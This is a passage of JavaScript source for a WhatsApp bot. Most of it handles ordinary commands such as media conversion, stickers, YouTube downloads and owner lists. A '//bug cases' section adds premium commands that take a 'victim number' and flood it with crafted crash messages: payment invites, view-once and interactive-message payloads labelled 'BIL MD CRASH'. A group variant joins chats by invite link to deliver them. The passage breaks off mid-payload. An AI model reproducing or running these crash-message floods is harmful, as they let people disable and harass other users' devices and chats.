                GlobalTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                GlobalTechInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgxeon.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyglobal(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                GlobalTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyglobal(`Reply sticker with caption *${prefix + command}*`)
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await GlobalTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replyglobal(mess.wait)
                let media = await GlobalTechInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyglobal(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyglobal(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyglobal(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyglobal(`Example : ${prefix + command} 😅+🤔`)
                replyglobal(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await GlobalTechInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replyglobal(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                    GlobalTechInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                    GlobalTechInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyglobal(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await GlobalTechInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replyglobal(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyglobal(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replyglobal(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replyglobal(mess.owner)
if (!args[0]) return replyglobal(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await GlobalTechInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyglobal(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyglobal(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replyglobal(mess.owner)
if (!args[0]) return replyglobal(`Use ${prefix+command} nomor\nExample ${prefix+command} 923444844060`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyglobal(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Video Name?')
                if (VideoXeon.includes(q)) return replyglobal("The name you entered already exists")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replyglobal(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replyglobal("Name Does Not Exist in Database")
                let wanu = VideoXeon.indexOf(q)
                VideoXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./GlobalMedia/video/${q}.mp4`)
                replyglobal(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('The name of the image?')
                if (ImageXeon.includes(q)) return replyglobal("The name you entered is already registered in the database")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                ImageXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(delb)
                replyglobal(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Image Name')
                if (!ImageXeon.includes(q)) return replyglobal("The image name you entered is not registered")
                let wanu = ImageXeon.indexOf(q)
                ImageXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                fs.unlinkSync(`./GlobalMedia/image/${q}.jpg`)
                replyglobal(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replyglobal("Name Already In Use")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replyglobal(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerGlobalTechInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./GlobalMedia/sticker/${q}.webp`)
                replyglobal(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replyglobal("Name Already In Use")
                let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./GlobalMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replyglobal(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replyglobal(mess.prem)
                if (args.length < 1) return replyglobal('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replyglobal("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./GlobalMedia/audio/${q}.mp3`)
                replyglobal(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replyglobal(mess.prem)
await loading()
if (args.length < 1) return replyglobal(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./GlobalMedia/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replyglobal(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replyglobal(mess.prem)
await loading()
if (args.length < 1) return replyglobal('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./GlobalMedia/zip/${teks}.zip`)
replyglobal(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replyglobal(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replyglobal(mess.prem)
await loading()
if (args.length < 1) return replyglobal('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./GlobalMedia/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replyglobal(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replyglobal(mess.prem)
await loading()
if (args.length < 1) return replyglobal('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./GlobalMedia/apk/${teks}.apk`)
replyglobal(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replyglobal(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replyglobal(mess.prem)
await loading()
if (args.length < 1) return replyglobal('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replyglobal("This name is already in use")
let delb = await GlobalTechInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./GlobalMedia/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replyglobal(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replyglobal(mess.prem)
await loading()
if (args.length < 1) return replyglobal('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replyglobal("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./GlobalMedia/doc/${teks}.pdf`)
replyglobal(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replyglobal(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replyglobal(mess.group)
                if (isAfkOn) return replyglobal("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replyglobal(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case 'play':  case 'song': {
if (!text) return replyglobal(`Example : ${prefix + command} anime whatsapp status`)
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await GlobalTechInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replyglobal(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await xeonaudp3.mp3(text)
await GlobalTechInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }
    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replyglobal(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await GlobalTechInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
GlobalTechInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await GlobalTechInc.sendMessage(m.chat, { audio: GlobalTechInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case "xandroid": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the bot only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xandroid2":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the bot only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xgc":
  {
    if (!isPremium) return replyglobal(mess.prem)
    if (!text) {
      return replyglobal("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replyglobal("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replyglobal("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await GlobalTechInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replyglobal("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      GlobalTechInc.groupLeave(groupTarget);
    } catch (error) {
      replyglobal(util.format(error));
    }
  }
  break;
  case "🙂":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the bot only!*");
    }
    if (!text){
      return replyglobal(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "systemuicrash": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  if (!isPremium) return replyglobal(mess.prem)
  if (!text) return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replyglobal(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  replyglobal("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case 'oneshot': {
	if (!isCreator) return replyglobal(mess.owner)
if (!text) return replyglobal(`Usage .${command} 923444844060`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 923444844060`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
    }
    if (cleanedNumber == "919366316008") {
    return;
    }
    if (cleanedNumber == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function xeonIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await GlobalTechInc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '#BIL MD CRASH ☠️🔥',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '#BIL MD CRASH ☠️🔥',
								title: '#BIL MD CRASH ☠️🔥',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
